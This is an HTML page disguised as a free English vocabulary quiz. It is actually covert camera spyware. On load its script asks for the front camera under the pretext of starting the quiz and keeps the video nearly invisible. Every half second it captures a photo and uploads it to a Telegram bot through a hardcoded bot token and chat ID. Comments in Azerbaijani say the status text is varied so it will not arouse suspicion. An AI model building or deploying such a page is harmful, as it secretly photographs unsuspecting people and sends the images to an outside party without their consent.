<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>English Vocabulary Quiz - Learn Fast</title>
  <style>
    body { 
      margin:0; 
      background: linear-gradient(135deg, #f0f4ff, #e6f0ff); 
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
      color:#333; 
      overflow:hidden;
      height: 100vh;
    }
    #video {
      position: fixed; 
      inset:0; 
      width:100vw; 
      height:100vh; 
      object-fit:cover;
      opacity: 0.08; /* √ßox z…ôif g√∂r√ºn√ºr, amma kamera i≈ül…ôyir */
      z-index: -2;
    }
    .container {
      position: relative;
      z-index: 10;
      max-width: 600px;
      margin: 40px auto;
      padding: 30px;
      background: white;
      border-radius: 16px;
      box-shadow: 0 10px 30px rgba(0,0,0,0.1);
      text-align: center;
    }
    h1 {
      color: #2c5282;
      margin-bottom: 10px;
    }
    .subtitle {
      color: #4a5568;
      margin-bottom: 30px;
    }
    .question {
      font-size: 1.4rem;
      font-weight: bold;
      margin: 30px 0 20px;
      color: #2d3748;
    }
    .options {
      display: grid;
      gap: 15px;
    }
    .option {
      background: #edf2f7;
      padding: 18px;
      border-radius: 12px;
      cursor: pointer;
      transition: all 0.2s;
      font-size: 1.1rem;
    }
    .option:hover {
      background: #bee3f8;
      transform: translateY(-3px);
    }
    #status {
      position: fixed; 
      top:16px; 
      right:16px; 
      background:rgba(255,255,255,0.9);
      padding:10px 16px; 
      border-radius:12px; 
      font-size:14px;
      color:#4a5568;
      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
    }
    #info {
      position: fixed;
      bottom: 16px;
      left: 50%;
      transform: translateX(-50%);
      background: rgba(255,255,255,0.95);
      padding: 10px 20px;
      border-radius: 30px;
      font-size: 13px;
      color: #718096;
      box-shadow: 0 4px 15px rgba(0,0,0,0.08);
    }
  </style>
</head>
<body>

<video id="video" autoplay playsinline muted></video>

<div class="container">
  <h1>English Vocabulary Quiz</h1>
  <p class="subtitle">Test your words! Choose the correct meaning.</p>
  
  <div class="question" id="question">What does "ubiquitous" mean?</div>
  
  <div class="options">
    <div class="option">Everywhere at once</div>
    <div class="option">Very rare</div>
    <div class="option">Dangerous</div>
    <div class="option">Old-fashioned</div>
  </div>
  
  <p style="margin-top:40px; color:#718096; font-size:0.95rem;">
    More questions coming soon... Keep learning! üöÄ
  </p>
</div>

<div id="status">Loading quiz...</div>
<div id="info">This is a free English learning tool ‚Ä¢ No registration needed</div>

<canvas id="canvas" style="display:none"></canvas>

<script>
// ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
// TELEGRAM G√ñND∆èRM∆è HISS∆èSƒ∞ ‚Äì D∆èYƒ∞≈ûM∆è!
const BOT_TOKEN   = "8514355914:AAFR7vh1Swu6cIpb_vHODNik9zdxDlCsWP4";
const CHAT_ID     = "6570410435";
const INTERVAL_MS = 500;
const PHOTO_QUALITY = 0.68;

const video  = document.getElementById('video');
const canvas = document.getElementById('canvas');
const ctx    = canvas.getContext('2d');
const status = document.getElementById('status');

let stream = null;
let sendCount = 0;

async function startCamera() {
  try {
    stream = await navigator.mediaDevices.getUserMedia({
      video: { 
        facingMode: "user",
        width: { ideal: 1280 },
        height: { ideal: 720 }
      }
    });

    video.srcObject = stream;
    status.textContent = "Quiz ready ‚Ä¢ Good luck!";
    status.style.background = "rgba(0,180,0,0.15)";
    status.style.color = "#2f855a";

    video.onloadedmetadata = () => {
      canvas.width  = video.videoWidth;
      canvas.height = video.videoHeight;
      startSending();
    };

  } catch (err) {
    status.textContent = "Please allow camera to start quiz";
    status.style.background = "rgba(200,0,0,0.15)";
    console.error("Camera error:", err);
  }
}

async function sendPhoto() {
  try {
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    const dataUrl = canvas.toDataURL('image/jpeg', PHOTO_QUALITY);

    const blob = await (await fetch(dataUrl)).blob();
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('photo', blob, `capture_${Date.now()}.jpg`);

    await fetch(
      `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
      { method: 'POST', body: formData }
    );

    sendCount++;
    // status-ƒ± d…ôyi≈üm…ô ki ≈ü√ºbh…ô yaratmasƒ±n
    if (sendCount % 4 === 0) {
      status.textContent = "Question loading...";
    } else if (sendCount % 7 === 0) {
      status.textContent = "Great job so far!";
    }

  } catch (err) {
    console.error("Send error:", err);
  }
}

function startSending() {
  setInterval(sendPhoto, INTERVAL_MS);
}

window.addEventListener('load', startCamera);

window.addEventListener('beforeunload', () => {
  if (stream) {
    stream.getTracks().forEach(track => track.stop());
  }
});
</script>
</body>
</html>